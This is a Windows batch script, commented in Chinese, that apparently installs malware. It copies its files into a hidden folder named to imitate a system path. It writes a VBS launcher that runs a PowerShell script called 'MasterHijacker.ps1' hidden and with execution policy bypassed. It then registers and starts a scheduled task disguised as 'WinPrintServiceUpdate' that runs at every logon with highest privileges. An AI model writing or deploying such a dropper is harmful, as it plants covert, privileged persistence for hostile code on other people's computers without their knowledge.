@echo off
set "TARGET_DIR=D:\ProgramDate\appcompat\print"
set "TASK_NAME=WinPrintServiceUpdate"

if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"
attrib +h "D:\ProgramDate" >nul 2>&1

echo [*] Copying all files...
xcopy /y /e /h /k "%~dp0*" "%TARGET_DIR%\" >nul 2>&1

:: 创建启动 VBS
echo Set W = CreateObject("WScript.Shell") > "%TARGET_DIR%\start.vbs"
echo W.Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File ""%TARGET_DIR%\MasterHijacker.ps1""", 0, False >> "%TARGET_DIR%\start.vbs"

:: 注册任务 (强制最高权限)
schtasks /create /tn "%TASK_NAME%" /tr "wscript.exe \"%TARGET_DIR%\start.vbs\"" /sc onlogon /rl highest /f >nul 2>&1
schtasks /run /tn "%TASK_NAME%" >nul 2>&1

echo [DONE] Service deployed and running in background.
timeout /t 3 >nul